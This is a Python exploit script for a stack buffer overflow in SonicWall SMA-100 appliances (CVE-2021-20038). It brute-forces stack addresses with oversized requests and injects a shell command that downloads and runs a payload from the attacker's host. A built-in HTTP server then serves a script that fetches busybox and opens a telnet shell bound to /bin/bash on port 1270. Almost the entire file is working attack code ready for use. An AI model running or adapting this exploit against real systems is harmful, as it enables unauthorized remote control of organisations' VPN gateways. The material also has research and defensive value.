from __future__ import division
from http.server import HTTPServer, BaseHTTPRequestHandler
from multiprocessing import Pool
from functools import partial
from itertools import repeat
from threading import Thread
import argparse
import socket
import time
import ssl
import sys
import os

def do_banner():
    print("")
    print("▄▄▄▄    ▄▄▄      ▓█████▄     ▄▄▄▄    ██▓     ▒█████   ▒█████  ▓█████▄     ")
    print("▓█████▄ ▒████▄    ▒██▀ ██▌   ▓█████▄ ▓██▒    ▒██▒  ██▒▒██▒  ██▒▒██▀ ██▌  ")
    print("▒██▒ ▄██▒██  ▀█▄  ░██   █▌   ▒██▒ ▄██▒██░    ▒██░  ██▒▒██░  ██▒░██   █▌")
    print("▒██░█▀  ░██▄▄▄▄██ ░▓█▄   ▌   ▒██░█▀  ▒██░    ▒██   ██░▒██   ██░░▓█▄   ▌ ")
    print("░▓█  ▀█▓ ▓█   ▓██▒░▒████▓    ░▓█  ▀█▓░██████▒░ ████▓▒░░ ████▓▒░░▒████▓ ") 
    print("░▒▓███▀▒ ▒▒   ▓▒█░ ▒▒▓  ▒    ░▒▓███▀▒░ ▒░▓  ░░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒▒▓  ▒ ") 
    print("▒░▒   ░   ▒   ▒▒ ░ ░ ▒  ▒    ▒░▒   ░ ░ ░ ▒  ░  ░ ▒ ▒░   ░ ▒ ▒░  ░ ▒  ▒  ") 
    print(" ░    ░   ░   ▒    ░ ░  ░     ░    ░   ░ ░   ░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░  ░  ") 
    print(" ░            ░  ░   ░        ░          ░  ░    ░ ░      ░ ░     ░     ")    
    print("      ░            ░               ░                            ░       ")
    print("")    


##
# The server that listens for the exploits HTTP callback. The script is hard coded below. Basically,
# it will download busybox to the box, and create a telnet service on 1270 for the attacker to
# telnet to.
##
class PayloadServer(BaseHTTPRequestHandler):

    def do_GET(self):
        print('\n[*] Received an HTTP callback from %s at %s' % (self.address_string(), self.log_date_time_string()))
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"#!/bin/sh\ncurl --insecure https://www.busybox.net/downloads/binaries/1.28.1-defconfig-multiarch/busybox-i686 -o /tmp/busybox\nchmod +x /tmp/busybox\n/tmp/busybox telnetd -p 1270 -l /bin/bash\n")

##
# Loops through the possible top addresses and returns an array
##
def generate_stack_top_addresses():
    base = 0xbf800000
    curr = base
    step = 0x1000
    base_array = []
    while curr != 0xbffff000:
        base_array.append(curr)
        curr += step
     
    return base_array

##
# Our strategy is to try addresses in the middle of the range and work outwards. That means
# that we are always trying to exploit the most likely to be exploited addresses first.
##
def generate_all_addresses(top_addresses, low, high):

    # the array of addresses that we'll return
    all_array = []

    # Start with the median value and work outward
    start_value = (high + low) // 2

    # Ensure this is aligned
    if (start_value % 0x10) != 0:
        print('[-] Address generation failed: %lx' % (start_value % 0x10))
        return all_array

    # step_values will be treated as a fifo
    step_values = []
    step_values.append(start_value)

    # visited steps
    step_set = set()

    # produce all the addresses
    while step_values:
        curr_step = step_values.pop(0)
        
        # for each base address, produce the current step
        for base in top_addresses:
            address = base - curr_step # subtract! we are working off of top addresses
            all_array.append(address)

        step_set.add(curr_step)

        # increment / decrement the step
        high_step = curr_step + 0x10
        if (high_step not in step_set and high_step < high):
            step_values.append(high_step)
        
        low_step = curr_step - 0x10
        if (low_step not in step_set and low_step > low):
            step_values.append(low_step)

    return all_array

##
# The payload ~as written~ guesses multiple addresses at once. Technically four last I looked.
# This would need to be updated if that changed at all. This function just returns a list that
# ensures all addresses are visited once.
#
# How does the payload guess four at once? Well. The way the payload is currently written, we
# know we are dereferencing a stack address. We specifically dereference $ebp+8 (from
# the context of the mod_cgi.so+0x003fe6). $ebp+8, when successful, dereferences to $ebp+12.
# However! It can also be successful if it dereferences to $ebp+12+0x50 since the data is
# repeated 0x50 after the first one. As such, if [$ebp+8] dereferences to the next address or
# 0x50+4, either way we win. So we can exclude every 0x50th guess.
##
def filter_addresses(address_list):
    return_list = []
    visited_set = set()

    for address in address_list:
        if address not in visited_set:
            return_list.append(address)
            visited_set.add(address)
            visited_set.add(address - 0x50)
            visited_set.add(address + 0x170)
            visited_set.add(address + 0x1c0)

    return return_list

##
# Sends a payload that will crash a fork. Loop and do it 64 times
# for good measure.
##
def send_crashes(host, port):
    for x in range(64):
        request = b'GET /badblood?' + (b'a'*400) + b'\r\n\r\n'
        ssl_request(args.rhost, args.rport, request)

##
# Adjust the start address so that it will point to the
# second address. URL encode.
##
def test_and_encode_first_address(address):
    address -= 0x110
    address += 4

    one = (address >> 24) & 0x000000ff
    two = (address >> 16) & 0x000000ff
    three = (address >> 8) & 0x000000ff
    four = (address & 0x000000ff)

    if one == 0 or two == 0 or three == 0 or four == 0:
        return ""

    addr_one = (b"%" + str.encode('{:02x}'.format(four, 'x')) +
               b"%" + str.encode('{:02x}'.format(three, 'x')) +
               b"%" + str.encode('{:02x}'.format(two, 'x')) +
               b"%" + str.encode('{:02x}'.format(one, 'x')))
    return addr_one

##
# Adjusts the start address so that it will point to the call to
# system, url enocde, and check for invalid values.
##
def test_and_encode_second_address(address):

    address += 8
    
    one = (address >> 24) & 0x000000ff
    two = (address >> 16) & 0x000000ff
    three = (address >> 8) & 0x000000ff
    four = (address & 0x000000ff)

    if one == 0x28 or two == 0x28 or three == 0x28 or four == 0x28:
        # shell metacharacters break the payload :grimacing:
        return ""

    addr_two = (b"%" + str.encode('{:02x}'.format(four, 'x')) +
               b"%" + str.encode('{:02x}'.format(three, 'x')) +
               b"%" + str.encode('{:02x}'.format(two, 'x')) +
               b"%" + str.encode('{:02x}'.format(one, 'x')))
    return addr_two

##
# Generic open socket, do ssl, send data, close socket.
# Don't wait around for a response
##
def ssl_request(host, addr, request):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    wrappedSocket = ssl.wrap_socket(sock)
    wrappedSocket.connect((host, addr))
    wrappedSocket.send(request)
    wrappedSocket.recv(1)
    wrappedSocket.close()

##
# Handles a single HTTP request before killing the program.
##
def serve_once(httpd):
    httpd.handle_request()
    print('[*] Now we got bad blood. Hey! 🦞')
    sys.stdout = open(os.devnull, "w")

    # hang the connection and ensure the download happens
    time.sleep(5)
    os._exit(1)

##
# Formats the exploit given the address, etc. and then shoves it out an SSL connection
## 
def send_exploit(address, rhost, rport, lhost, system_addr, rhostname):

    encoded_addr_one = test_and_encode_first_address(address)
    if encoded_addr_one == "":
        return

    encoded_addr_two = test_and_encode_second_address(address)
    if encoded_addr_two == "":
        return

    # the only variable sized item in the "shell_cmd" below is the lhost. because
    # alignment is so important to the final payload, we have to pad out command.
    pad = 'a' * (15 - len(lhost))

    # the shell_cmd that will get executed. Basic callback, download, chmod, and execute
    shell_cmd = ";{curl," + lhost + ":1270,-o,/tmp/a};{chmod,+x,/tmp/a};/tmp/a;" + pad
    exploit = encoded_addr_one + encoded_addr_two + encoded_addr_two + system_addr + shell_cmd.encode('utf-8')

    # adjust the trailing z's to account for the hostname size and IP address size
    spray_pray = b"/" + (exploit*2) + b"?" + (b'z'*(476-len(lhost)-len(rhostname)))
    request = b'GET ' + spray_pray + b'\r\n\r\n'

    ssl_request(rhost, rport, request)

# The httpd executable does not have a randomized base so we'll
# jump through that in order to reach system(). Below are the
# supported versions and the httpd address.
version_dict =	{
    "10.2.1.2-24sv": b"%08%b7%06%08",
    "10.2.1.1-19sv": b"%64%b8%06%08",
    "10.2.1.0-17sv": b"%64%b8%06%08"
}

# Dump the supported version dict to screen
def print_supported_versions():
    print("[+] Supported versions:")
    for key, value in version_dict.items() :
        print("\t- %s" % key)

if __name__ == '__main__':

    do_banner()

    top_parser = argparse.ArgumentParser(description='SonicWall SMA-100 Series Stack-Buffer Overflow Exploit (CVE-2021-20038)')
    required_args = top_parser.add_argument_group('required arguments')
    required_args.add_argument('--rhost', action="store", dest="rhost", required=True, help="The IPv4 address to connect to")
    required_args.add_argument('--rport', action="store", dest="rport", type=int, help="The port to connect to", default="443")
    required_args.add_argument('--lhost', action="store", dest="lhost", required=True, help="The address to connect back to")
    required_args.add_argument('--rversion',action="store", dest="rversion", help="The version of the remote target")
    required_args.add_argument('--rhostname',action="store", dest="rhostname", help="The hostname of the remote target target", default="sslvpn")
    top_parser.add_argument('--supported-versions',action="store_true", dest="supported_versions", help="The list of supported SMA-100 versions")
    top_parser.add_argument('--workers', action="store", dest="workers", type=int, required=False, help="The number of workers to spew the exploit", default=4)
    top_parser.add_argument('--nocrash', action="store_true", dest="nocrash", help="Stops the exploit from sending a series of crash payload to start")
    top_parser.add_argument('--enable-stderr', action="store_true", dest="enablestderr", help="Enable stderr for debugging")
    top_parser.add_argument('--addr', action="store", dest="addr", type=int, required=False, help="Test only. If you know the crash address, go wild.", default=0)
    top_parser.add_argument('--top-addr', action="store", dest="top_addr", type=int, required=False, help="Test only. If you know the stack's top address, go wild.", default=0)
    args = top_parser.parse_args()

    if args.supported_versions == True:
        print_supported_versions()
        sys.exit(1)

    if args.rversion not in version_dict:
        printf("[-] User specified an unsupported SMA-100 version. Exiting.")
        sys.exit(1)
    
    if len(args.lhost) > 15:
        printf('[-] lhost must be less than 16 bytes. Alignment issues, sorry!')
        sys.exit(1)

    # Spin up a server for the exploit to call back to
    print('[+] Spinning up HTTP server')
    httpd = HTTPServer((args.lhost, 1270), PayloadServer)
    httpd_thread = Thread(target=serve_once, args=(httpd, ))
    httpd_thread.setDaemon(True)
    httpd_thread.start()
 
    # Generate the addresses we'll craft into the exploit payload
    if args.addr != 0:
        print('[+] User provided the crash address: %lx' % args.addr)
        all_addresses = [ args.addr ]
    elif args.top_addr != 0:
        print('[+] User provided the top stack address: %lx' % args.top_addr)
        top_addresses = [ args.top_addr ]
        all_addresses = generate_all_addresses(top_addresses, 0x800, 0x2800)
        print('[+] Generated %u total addresses to search' % len(all_addresses))
    else:
        print('[+] User did not provide an address. We\'ll guess it.')
        top_addresses = generate_stack_top_addresses()
        print('[+] Generated %u base addresses' % len(top_addresses))
        all_addresses = generate_all_addresses(top_addresses, 0x800, 0x2800)
        print('[+] Generated %u total addresses to search' % len(all_addresses))

    # Filter the addresses. Our payload guess multiple addresses at once
    print('[+] Filtering addresses for double visits (thanks awesome payload!)')
    all_addresses = filter_addresses(all_addresses)
    print('[+] Filtered down to %u total addresses to search' % len(all_addresses))

    if args.nocrash == False:
        # Send 64 requests to crash all the forks. That's probably enough.
        print('[+] Crashing all forks to reset stack to a semi-predicatable state')
        send_crashes(args.rhost, args.rport)
        print('[+] Crashing complete. Good job. Let\'s go do work.')
    else:
        print('[!] Skipping fork crashing at user request.')

    if args.enablestderr == False:
        print('[+] Disabling stderr')
        sys.stderr = open(os.devnull, "w")

    print('[+] Spawning %u workers' % args.workers)
    pool = Pool(processes=args.workers)

    address_count = len(all_addresses)
    print('[+] Attempting to exploit the remote server. This might take quite some time. :eek:')
    for i, _ in enumerate(pool.imap(partial(send_exploit, rhost=args.rhost, rport=args.rport, lhost=args.lhost, system_addr=version_dict[args.rversion], rhostname=args.rhostname), all_addresses)):
        print('\r[%] Addresses Tested: {0:.0f}%'.format((i/address_count) * 100), end='')

    print('\n[!] Done guessing addresses. Let us sleep for a few seconds and hope for success')
    time.sleep(3)
    print('[?] If you are reading this, the exploit likely failed.')
